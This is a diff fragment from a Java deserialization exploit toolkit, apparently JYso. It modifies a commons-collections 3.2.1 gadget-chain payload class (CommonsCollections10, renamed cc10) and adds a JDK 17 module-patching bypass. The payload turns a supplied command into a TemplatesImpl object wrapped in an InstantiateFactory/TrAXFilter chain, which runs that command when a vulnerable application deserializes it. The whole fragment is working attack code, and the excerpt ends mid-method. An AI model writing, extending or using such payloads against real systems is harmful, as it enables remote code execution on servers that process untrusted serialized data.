@@ -15,14 +15,20 @@ import javax.xml.transform.Templates;
 import java.util.HashMap;
 import java.util.Map;
 
+import static com.qi4l.JYso.gadgets.utils.jdk17Bypass.patchModule;
+
 
 @Dependencies({"commons-collections:commons-collections:3.2.1"})
-public class CommonsCollections10 implements ObjectPayload<Object> {
-
+public class cc10 implements ObjectPayload<Object> {
     public Object getObject(String command) throws Exception {
         final Object templates;
 
         templates = Gadgets.createTemplatesImpl(command);
+
+        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
+        patchModule(cc4_17.class,aClass);
+
+
         // 使用 InstantiateFactory 代替 InstantiateTransformer
         InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});
         FactoryTransformer factoryTransformer = new FactoryTransformer((Factory) instantiateFactory);
